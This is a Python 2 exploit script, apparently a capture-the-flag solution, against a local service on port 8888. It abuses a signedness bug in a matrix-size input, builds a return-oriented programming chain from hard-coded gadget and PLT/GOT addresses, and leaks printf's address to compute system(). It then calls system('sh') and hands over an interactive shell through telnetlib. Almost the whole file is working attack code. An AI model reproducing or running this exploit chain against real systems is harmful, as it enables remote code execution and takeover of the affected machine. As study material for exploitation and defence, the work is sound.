#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "localhost"
PORT = 8888
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def comm(rx, tx):
    buf = rtil_str(rx)
    s.send(tx)
    return buf


# an obvious signedness issue in the binary
# hinted by the presence of abs() being
# called on the user input :|

# rop gadgets and stuff
printf_plt = 0x4005a0
puts_plt = 0x400590
fflush_plt = 0x4005f0
read_plt = 0x4005c0

p_rdi = 0x400f03
ppret = 0x400f00 
pppret = 0x400efe
ret = 0x400f1c

magic_g1 = 0x400EFA         # setter gadget in _init
magic_g2 = 0x400EE0         # second part of setter gadget

printf_got = 0x602020
name_buf = 0x6020A0

cmd = "sh"
name = ""
name += struct.pack("<Q", read_plt)
name += struct.pack("<Q", magic_g1)
name += "S" * 8                                                             # address of system goes here
name += cmd + "\x00"
name = name.ljust(1024, "a")

comm("name\n", name)

mx_size = 22                # 22 is cool here
                            # because with this
                            # we don't have to worry about
                            # the rest of the main() function
                            # it exits before doing the rest :)

comm("matrix\n", str(-mx_size) + "\n")

rop_chain = []
rop_chain += [p_rdi, printf_got, puts_plt, p_rdi, 0x0, fflush_plt]
rop_chain += [magic_g1, 0x0, 0x5, name_buf, 0x8, name_buf + 0x10, 0x0, magic_g2]
rop_chain += [0x5, name_buf + 0x10 - 0x2007768, 0x8, name_buf + 0x10, name_buf + 0x18, magic_g2]

matrix = [0x42424242 + i for i in range(mx_size ** 2 - len(rop_chain))]
matrix = rop_chain + matrix
matrix[43] = ret                                                            # first rip

matrix = matrix[:44]

for i in range(len(matrix)):
    comm(": ", str(matrix[i]) + "\n")

buf = s.recv(10)
leak = buf[-7:-1].ljust(8, "\x00")
leak = struct.unpack("<Q", leak)[0]
system = leak - 0xf480

print "[+] Leaked address of printf: %s [+]"%(hex(leak))
print "[+] Leaked address of system: %s [+]"%(hex(system))

# send computed address of system
s.send(struct.pack("<Q", system))

print "[+] shell [+]"
t = telnetlib.Telnet()
t.sock = s
t.interact()
